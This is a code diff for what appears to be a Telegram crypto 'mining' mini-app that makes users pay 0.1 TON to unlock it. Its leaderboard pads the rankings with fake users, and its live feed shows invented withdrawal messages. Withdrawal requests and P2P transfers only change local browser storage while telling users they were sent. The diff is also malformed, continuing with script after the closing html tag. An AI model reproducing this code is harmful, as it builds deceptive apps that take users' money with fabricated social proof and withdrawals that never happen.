@@ -784,6 +784,219 @@ function closeMysteryBox() {
     content.innerHTML = `<div class="spin-result-label" style="color:#00d4ff; font-size:14px;">Mystery Box</div><div style="font-size:70px; margin: 15px 0; filter: drop-shadow(0 0 20px rgba(139, 92, 246, 0.8));">🎁</div><div style="font-size:11px; color:#a8c5ff; margin-bottom:15px; line-height:1.4;">Win GROV (starts at 500!) or a rare <b>Diamond 💎</b>!</div><button id="mysteryPayBtn" class="spin-result-btn" style="background:linear-gradient(135deg,#8b5cf6,#6b46c1); color:#fff;" onclick="payMysteryBox()">💎 OPEN FOR 1,000 GROV</button><button class="spin-result-btn" style="background:rgba(255,255,255,0.1); color:#fff; margin-top:8px; font-size:12px; padding:10px;" onclick="closeMysteryBox()">Cancel</button>`;
   }, 300);
 }
+     // --- TASKS ---
+  let userTasks = JSON.parse(localStorage.getItem('grover_tasks')) || [
+    { id: 't_share', name: 'Share on Telegram/X', reward: 100, link: 'SHARE_APP' },
+    { id: 't1', name: 'Follow on X', reward: 50, link: 'https://x.com/grovmining' },
+    { id: 't2', name: 'Join Telegram', reward: 50, link: 'https://t.me/GrovOfficial' }
+  ];
+  function renderUserTasks() {
+    const list = document.getElementById('tasksList'); if (!list) return;
+    list.innerHTML = '';
+    userTasks.forEach((t, i) => {
+      const div = document.createElement('div'); div.className = 'task-item';
+      div.innerHTML = `<div class="task-left"><div class="task-icon">📌</div><div class="task-info"><div class="task-name">${t.name}</div><div class="task-reward">+${t.reward} GROV</div></div></div><button class="task-btn" onclick="doTask('${t.link}')">GO</button>`;
+      list.appendChild(div);
+    });
+  }
+  function doTask(link) {
+    if (link === 'SHARE_APP') {
+      const today = new Date().toDateString();
+      if (state.lastShare === today) return toast('❌ Already shared today!');
+      state.balance += 100; state.lastShare = today; saveState(); updateBalanceDisplay();
+      const shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent('https://t.me/GroverMiningBot/app') + '&text=' + encodeURIComponent('Join Grover Miner and earn GROV!');
+      if (tg) tg.openTelegramLink(shareUrl);
+      toast('✅ Shared! +100 GROV'); return;
+    }
+    if (link) window.open(link, '_blank'); toast('Task opened!');
+  }
+
+  // --- REFERRAL ---
+  function checkReferralMilestones() {
+    if (state.referralCount >= 5 && !state.ms5) { state.ms5 = true; state.balance += 500; saveState(); toast('🎉 Milestone: 5 Friends! +500 GROV'); }
+    if (state.referralCount >= 10 && !state.ms10) { state.ms10 = true; state.balance += 1500; saveState(); toast('🎉 Milestone: 10 Friends! +1,500 GROV'); }
+    if (state.referralCount >= 50 && !state.ms50) { state.ms50 = true; state.balance += 10000; saveState(); toast('🎉 Milestone: 50 Friends! +10,000 GROV'); }
+    updateBalanceDisplay();
+  }
+
+  function renderLeaderboard() {
+    const list = document.getElementById('leaderboardList'); if (!list) return;
+    let allUsers = [...fakeUsers];
+    allUsers.push({ name: 'You', refs: state.referralCount, isMe: true });
+    allUsers.sort((a, b) => b.refs - a.refs);
+    const myIndex = allUsers.findIndex(u => u.isMe);
+    const rankEl = document.getElementById('userRankDisplay'); if (rankEl) rankEl.textContent = '#' + (myIndex + 1);
+    list.innerHTML = '';
+    allUsers.slice(0, 10).forEach((u, i) => {
+      let medal = i === 0 ? '🥇 ' : i === 1 ? '🥈 ' : i === 2 ? '🥉 ' : '';
+      const isMeStyle = u.isMe ? 'border:1px solid #00d4ff; background:rgba(0,212,255,0.1);' : 'background:rgba(255,255,255,0.05);';
+      const row = document.createElement('div');
+      row.style.cssText = `display:flex; justify-content:space-between; padding:8px 10px; border-radius:8px; font-size:11px; ${isMeStyle}`;
+      row.innerHTML = `<div style="color:#fff; font-weight:${u.isMe ? '900' : '600'};">${medal}${u.name}</div><div style="color:#f5b800; font-weight:900;">${u.refs} refs</div>`;
+      list.appendChild(row);
+    });
+  }
+
+  function referFriend() {
+    const code = getOrCreateReferralCode();
+    const link = 'https://t.me/GroverMiningBot/app?startapp=' + code;
+    const text = 'Join Grover Miner and earn GROV! My code: ' + code;
+    if (tg && tg.openTelegramLink) { tg.openTelegramLink('https://t.me/share/url?url=' + encodeURIComponent(link) + '&text=' + encodeURIComponent(text)); }
+    else { if (navigator.clipboard) navigator.clipboard.writeText(link); toast('📋 Link copied!'); }
+  }
+  
+  function showMyLink() {
+    const code = getOrCreateReferralCode();
+    const link = 'https://t.me/GroverMiningBot/app?startapp=' + code;
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(link).then(() => { toast('📋 Link Copied!'); }).catch(() => { fallbackCopy(link); });
+    } else { fallbackCopy(link); }
+  }
+
+  function fallbackCopy(text) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text; textArea.style.position = "fixed";
+    document.body.appendChild(textArea);
+    textArea.focus(); textArea.select();
+    try { document.execCommand('copy'); toast('📋 Link Copied!'); } catch (err) { toast('❌ Failed to copy.'); }
+    document.body.removeChild(textArea);
+  }
+
+  // --- P2P & WITHDRAWAL ---
+  let withdrawalRequests = JSON.parse(localStorage.getItem('grover_withdrawals')) || [];
+  function requestWithdrawal() {
+    if (!state.walletPin) {
+      const newPin = prompt("🔒 Secure your wallet! Create a 4-digit PIN:");
+      if (!newPin || newPin.length < 4) return toast('❌ PIN must be 4 digits!');
+      state.walletPin = newPin; saveState(); toast('✅ PIN Created! Please try again.'); return;
+    }
+    const enteredPin = prompt("🔒 Enter your Wallet PIN to confirm:");
+    if (enteredPin !== state.walletPin) return toast('❌ Incorrect PIN!');
+
+    if (state.balance < 1000) return toast('❌ Minimum withdrawal is 1,000 GROV');
+    const walletAddr = prompt("Enter your TON Wallet Address (e.g. UQ...):");
+    if (!walletAddr) return;
+    const amount = parseFloat(prompt("Enter amount to withdraw (Min 1,000):"));
+    if (!amount || amount < 1000) return toast('❌ Invalid amount');
+    if (amount > state.balance) return toast('❌ Insufficient balance');
+    state.balance -= amount; saveState(); updateBalanceDisplay();
+    withdrawalRequests.push({ id: 'req_' + Date.now(), user: CURRENT_USER, amount: amount, wallet: walletAddr, status: 'Pending' });
+    localStorage.setItem('grover_withdrawals', JSON.stringify(withdrawalRequests));
+    toast('✅ Request Sent to Admin!');
+  }
+
+  function executeP2P() {
+    if (!state.walletPin) {
+      const newPin = prompt("🔒 Secure your wallet! Create a 4-digit PIN:");
+      if (!newPin || newPin.length < 4) return toast('❌ PIN must be 4 digits!');
+      state.walletPin = newPin; saveState(); toast('✅ PIN Created! Please try transfer again.'); return;
+    }
+    const enteredPin = prompt("🔒 Enter your Wallet PIN to confirm transfer:");
+    if (enteredPin !== state.walletPin) return toast('❌ Incorrect PIN!');
+
+    const recipient = document.getElementById('p2pRecipient').value.trim().toUpperCase();
+    const amount = parseFloat(document.getElementById('p2pAmount').value);
+    if (!recipient.startsWith('GRV')) return toast('❌ Invalid Invite Code');
+    if (!amount || amount <= 0) return toast('❌ Enter a valid amount');
+    if (amount > 10000) return toast('❌ Max 10,000 GROV');
+    if (amount > state.balance) return toast('❌ Insufficient balance');
+    const fee = amount * 0.05; const totalDeducted = amount + fee;
+    if (totalDeducted > state.balance) return toast('❌ Not enough for 5% fee');
+    state.balance -= totalDeducted; saveState(); updateBalanceDisplay();
+    document.getElementById('qP2P').checked = true;
+    document.getElementById('p2pRecipient').value = ''; document.getElementById('p2pAmount').value = '';
+    toast('✅ Sent ' + amount + ' GROV to ' + recipient);
+  }
+
+  // --- SUPPORT, ROADMAP, TOS, PFP ---
+  function openRoadmap() { document.getElementById('roadmapModal').classList.add('show'); }
+  function closeRoadmap() { document.getElementById('roadmapModal').classList.remove('show'); }
+  function openTOS() { document.getElementById('tosModal').classList.add('show'); }
+  function closeTOS() { document.getElementById('tosModal').classList.remove('show'); }
+  function openSupport() { 
+    if(tg) tg.openTelegramLink('https://t.me/Drafo1'); 
+    else toast('Support: @Drafo1'); 
+  }
+  function openPFP() {
+    document.getElementById('pfpModal').classList.add('show');
+    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
+      document.getElementById('pfpInitial').textContent = (tg.initDataUnsafe.user.first_name || 'G').charAt(0).toUpperCase();
+    }
+  }
+  function closePFP() { document.getElementById('pfpModal').classList.remove('show'); }
+
+  // --- TON CONNECT ---
+  let connectedWallet = null; let tonConnectUI = null;
+  const PROJECT_WALLET = 'UQBiiE8EcQ-tRSIi4HjKnCYjGJ0Wjh5SA84xyzbc-qdq5ws2';
+  try {
+    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://buywithus225-wq.github.io/Grover-miner-app/tonconnect-manifest.json', buttonRootId: null });
+    tonConnectUI.onStatusChange(wallet => {
+      const wi = document.getElementById('walletInfo'); const cb = document.getElementById('connectBtn'); const pb = document.getElementById('payBtn');
+      if (wallet) {
+        connectedWallet = wallet; const addr = wallet.account.address;
+        if (wi) { wi.textContent = '✅ ' + addr.slice(0, 6) + '...' + addr.slice(-4); wi.classList.add('show'); }
+        if (cb) cb.style.display = 'none'; if (pb) pb.classList.add('show');
+      } else { connectedWallet = null; if (wi) wi.classList.remove('show'); if (cb) cb.style.display = 'block'; if (pb) pb.classList.remove('show'); }
+    });
+  } catch (e) { console.log('TON error:', e); }
+
+  async function handleConnect() { if (!tonConnectUI) { toast('TON not loaded.'); return; } try { toast('Opening wallet...'); await tonConnectUI.openModal(); } catch (e) { toast('Cancelled.'); } }
+  async function handlePay() {
+    const tos = document.getElementById('tosCheckbox');
+    if (tos && !tos.checked) return toast('❌ Please agree to Terms of Service first!');
+    if (!connectedWallet) return toast('Connect wallet first!');
+    try {
+      toast('Confirm payment...');
+      await tonConnectUI.sendTransaction({ validUntil: Math.floor(Date.now() / 1000) + 360, messages: [{ address: PROJECT_WALLET, amount: '100000000' }] });
+      unlockApp();
+    } catch (e) { toast('Payment cancelled.'); }
+  }
+
+  function unlockApp() {
+    state.hasPaid = true; 
+    if (!state.welcomeClaimed) { state.balance += WELCOME_BONUS; state.welcomeClaimed = true; setTimeout(() => toast('🎉 +100 GROV Welcome Bonus!'), 1000); }
+    saveState(); document.getElementById('gateScreen').classList.remove('active'); document.getElementById('homeScreen').classList.add('active');
+    document.getElementById('bottomNav').style.display = 'flex'; updateBalanceDisplay(); updateMiningCounter(); toast('Welcome to Grover!');
+  }
+
+  // --- LIVE FEED ---
+  const feedMessages = ["💸 @Chidi just withdrew 50,000 GROV!", "👑 @Aisha just upgraded to VIP Level 4!", "🎰 @Emeka just hit the 200 GROV Spin Jackpot!", "💎 @Fatima just bought a Diamond!", "🎁 @Tunde just opened a Mystery Box!", "💸 @John just withdrew 10,000 GROV!", "⚡ @Sarah just activated a 2X Mining Boost!", "🏆 @David just invited 5 friends and earned 500 GROV!"];
+  let feedIndex = 0;
+  function updateLiveFeed() {
+    const feedEl = document.getElementById('liveFeedText'); if (!feedEl) return;
+    feedEl.textContent = feedMessages[feedIndex];
+    feedEl.style.animation = 'none'; feedEl.offsetHeight; feedEl.style.animation = 'scrollFeed 15s linear infinite';
+    feedIndex = (feedIndex + 1) % feedMessages.length;
+  }
+
+  function checkIncomingReferral() {
+    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
+      const startParam = tg.initDataUnsafe.start_param;
+      if (startParam.startsWith('ref_')) {
+        const inviterCode = startParam.replace('ref_', '');
+        if (!localStorage.getItem('joined_via_' + CURRENT_USER)) {
+          localStorage.setItem('joined_via_' + CURRENT_USER, inviterCode);
+          state.balance += 50; saveState(); updateBalanceDisplay();
+          setTimeout(() => { toast('🎉 +50 GROV Welcome via Invite!'); }, 2000);
+        }
+      }
+    }
+  }
+
+  // --- INIT ---
+  loadState(); updateSpinTimer(); updateMiningCounter(); updateBalanceDisplay(); getOrCreateReferralCode();
+  checkIncomingReferral();
+  syncUserWithCloud(); // Sync with Render Backend
+  setInterval(updateMiningCounter, 1000);
+  updateLiveFeed(); setInterval(updateLiveFeed, 15000);
+  
+  if (state.hasPaid === true) {
+    document.getElementById('gateScreen').classList.remove('active'); document.getElementById('homeScreen').classList.add('active'); document.getElementById('bottomNav').style.display = 'flex';
+  }
+</script>
+
+</body>
+</html>
 
 function payMysteryBox() {
   if (state.balance < 1000) return toast('❌ Need 1,000 GROV to open!');
